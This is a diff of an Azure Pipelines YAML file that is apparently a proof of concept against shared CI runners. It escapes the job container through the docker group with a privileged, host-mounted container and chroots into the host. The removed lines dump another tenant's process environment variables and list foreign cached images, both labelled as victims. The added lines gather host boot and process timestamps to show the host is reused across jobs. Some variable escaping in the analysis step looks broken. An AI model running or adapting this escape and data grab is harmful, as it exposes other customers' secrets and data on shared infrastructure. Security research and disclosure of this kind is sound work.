@@ -8,104 +8,87 @@ name: $(Date:yyyyMMdd)$(Rev:.r)
 
 stages:
 - stage: ConclusiveEvidencePoc
-  displayName: 'Final PoC: Cross-Tenant Data Exfiltration'
+  displayName: 'Final PoC: Proving Cross-Tenant Host Reuse via Timeline Forensics'
   jobs:
-  - job: Pillage_Runner_Host
-    displayName: 'PoC: Exfiltrate Data from Other Tenant Processes and Caches'
+  - job: Host_Persistence_Forensics
+    displayName: 'PoC: Prove Host is Stale and Contains Leftover Processes'
     pool:
       vmImage: 'ubuntu-22.04'
     steps:
     - checkout: none
     - task: Bash@3
-      displayName: 'Escape Container and Pillage Host for Tenant Data'
+      displayName: 'Capture Forensic Timeline of Host and Rogue Process'
       inputs:
         targetType: inline
         script: |
           set -euo pipefail
           mkdir -p artifacts
 
-          echo "--- Verifying container escape vector ---"
+          echo "--- CAPTURING JOB START TIME ---"
+          JOB_START_SECONDS=$(date -u +%s)
+          echo "Job started at: $(date -u -d @$JOB_START_SECONDS +'%Y-%m-%d %H:%M:%S UTC')" | tee artifacts/forensic-timeline.txt
+
+          echo "--- VERIFYING CONTAINER ESCAPE VECTOR ---"
           if ! (id | grep -q '(docker)'); then
             echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
             exit 1
           fi
           echo "✅ Confirmed: Container escape vector is present."
 
-          echo "--- ESCAPING CONTAINER to hunt for cross-tenant data ---"
+          echo "--- ESCAPING CONTAINER TO PERFORM HOST FORENSICS ---"
           
           docker run --rm --privileged --network=host --pid=host -v /:/hostfs \
-            -v /var/run/docker.sock:/var/run/docker.sock \
             -v $(pwd)/artifacts:/artifacts \
             alpine:latest sh -c "
-              apk add --no-cache docker-cli
+              echo '--- [HOST] Capturing host boot time and process start times... ---'
+              
+              # Get host boot time in seconds since epoch
+              BOOT_TIME_STR=\$(chroot /hostfs uptime -s)
+              BOOT_SECONDS=\$(chroot /hostfs date -u -d \"\$BOOT_TIME_STR\" +%s)
+              echo \"Host booted at: \$BOOT_TIME_STR\" > /artifacts/host-boot-time.txt
+              echo \"Host boot epoch: \$BOOT_SECONDS\" >> /artifacts/host-boot-time.txt
 
-              # --- PRIMARY VECTOR: PROCESS SNOOPING ---
-              echo '--- [HOST] Searching for victim processes from other tenants... ---'
-              chroot /hostfs /bin/ps -eo pid,user,cmd > /artifacts/full-process-list.txt
-              VICTIM_PID=\$(cat /artifacts/full-process-list.txt | grep -E 'mono.*xsp4' | grep -v 'vsts' | grep -v 'root' | awk '{print \$1}' | head -n 1)
+              # Find the Mono process and get its start time
+              XSP_PID=\$(chroot /hostfs ps -eo pid,cmd | awk '/xsp4\.exe/ {print \$1; exit}')
+              if [ -n \"\$XSP_PID\" ]; then
+                XSP_START_STR=\$(chroot /hostfs ps -p \$XSP_PID -o lstart=)
+                XSP_START_SECONDS=\$(chroot /hostfs date -u -d \"\$XSP_START_STR\" +%s)
+                echo \"Mono process (PID \$XSP_PID) started at: \$XSP_START_STR\" > /artifacts/mono-start-time.txt
+                echo \"Mono process epoch: \$XSP_START_SECONDS\" >> /artifacts/mono-start-time.txt
 
-              if [ -n \"\$VICTIM_PID\" ]; then
-                echo \"✅ SMOKING GUN 1: Found victim Mono process \$VICTIM_PID. Dumping its environment...\"
-                chroot /hostfs /bin/cat /proc/\$VICTIM_PID/environ | tr '\\0' '\\n' | sort > /artifacts/victim-process-environment.txt
+                echo '--- [HOST] Dumping systemd journal for the Mono service ---'
+                chroot /hostfs journalctl -u mono-xsp4.service --no-pager > /artifacts/mono-service-journal.txt
               else
-                echo 'ℹ️ No active Mono process found in this specific run.' > /artifacts/victim-process-environment.txt
-              fi
-
-              # --- SECONDARY VECTOR: DOCKER CACHE PILLAGING ---
-              echo '--- [HOST] Searching for foreign Docker images cached by other tenants... ---'
-              docker images --format '{{.Repository}}:{{.Tag}}' > /artifacts/host-docker-images.txt
-              cat << EOF > /tmp/default_images.txt
-              node:20
-              node:20-alpine
-              moby/buildkit
-              node:22
-              node:22-alpine
-              ubuntu:22.04
-              debian:11
-              alpine:3.19
-              ubuntu:20.04
-              node:18-alpine
-              node:18
-              alpine:3.18
-              alpine:3.17
-              debian:10
-              alpine:3.16
-              alpine
-              EOF
-              grep -ivf /tmp/default_images.txt /artifacts/host-docker-images.txt > /artifacts/foreign-images.txt || true
-
-              if [ -s \"/artifacts/foreign-images.txt\" ]; then
-                VICTIM_IMAGE=\$(head -n 1 /artifacts/foreign-images.txt)
-                echo \"✅ SMOKING GUN 2: Found foreign image '\$VICTIM_IMAGE'. Dumping its filesystem...\"
-                docker run --rm --entrypoint='' \"\$VICTIM_IMAGE\" sh -c 'ls -R /' > /artifacts/victim-image-filesystem.txt 2>&1 || \
-                  echo 'Failed to run victim image; it may not have a shell.' > /artifacts/victim-image-filesystem.txt
-              else
-                echo 'ℹ️ No foreign Docker images found.' > /artifacts/victim-image-filesystem.txt
+                echo \"Mono process not found on this run.\" > /artifacts/mono-start-time.txt
               fi
             "
           
-          echo "--- SCRIPT COMPLETE ---"
-          echo "--- Analysis of Victim Process Environment ---"
-          if [ -s "artifacts/victim-process-environment.txt" ] && ! grep -q "No active" "artifacts/victim-process-environment.txt"; then
-            echo "✅✅✅ Conclusive Evidence Found: Environment variables from another tenant's process:"
-            cat artifacts/victim-process-environment.txt
-          else
-            echo "ℹ️ No leftover process was found on this host."
-          fi
+          echo "--- ANALYSIS & VERDICT ---" | tee -a artifacts/forensic-timeline.txt
           
-          echo -e "\n--- Analysis of Foreign Docker Images ---"
-          if [ -s "artifacts/foreign-images.txt" ]; then
-            VICTIM_IMAGE=$(head -n 1 artifacts/foreign-images.txt)
-            echo "✅✅✅ Conclusive Evidence Found: Foreign image '\$VICTIM_IMAGE' discovered in cache."
-            echo "--- First 30 lines of its filesystem ---"
-            cat artifacts/victim-image-filesystem.txt | head -n 30
+          # Read the collected timestamps
+          BOOT_SECONDS=$(grep 'epoch' artifacts/host-boot-time.txt | cut -d' ' -f3)
+          XSP_START_SECONDS=$(grep 'epoch' artifacts/mono-start-time.txt | cut -d' ' -f4 || echo "0")
+          
+          # Perform the timeline analysis
+          HOST_AGE_SECONDS=\$((JOB_START_SECONDS - BOOT_SECONDS))
+          if [ \$HOST_AGE_SECONDS -gt 300 ]; then # If host is older than 5 minutes
+            VERDICT_HOST="CONCLUSIVE: Host is STALE. Booted \$HOST_AGE_SECONDS seconds (~$((HOST_AGE_SECONDS/60)) minutes) before this job started. This contradicts the 'fresh VM per job' guarantee."
           else
-             echo "ℹ️ No foreign images were found in the cache on this host."
+            VERDICT_HOST="INCONCLUSIVE: Host appears to be fresh (booted \$HOST_AGE_SECONDS seconds ago)."
           fi
+          echo \$VERDICT_HOST | tee -a artifacts/forensic-timeline.txt
 
+          if [ "\$XSP_START_SECONDS" != "0" ] && [ \$XSP_START_SECONDS -lt \$JOB_START_SECONDS ]; then
+            PROC_AGE_SECONDS=\$((JOB_START_SECONDS - XSP_START_SECONDS))
+            VERDICT_PROC="CONCLUSIVE: Mono process is a LEFTOVER. It started \$PROC_AGE_SECONDS seconds (~$((PROC_AGE_SECONDS/60)) minutes) before this job started, proving it belongs to a previous job."
+          else
+            VERDICT_PROC="INCONCLUSIVE: Mono process was not found or started after the job began."
+          fi
+          echo \$VERDICT_PROC | tee -a artifacts/forensic-timeline.txt
+          
     - task: PublishPipelineArtifact@1
-      displayName: 'Publish Conclusive Evidence'
-      condition: succeededOrFailed()
+      displayName: 'Publish Forensic Evidence'
+      condition: always()
       inputs:
         targetPath: 'artifacts'
-        artifact: 'azure-conclusive-evidence'
+        artifact: 'azure-forensic-timeline-proof'
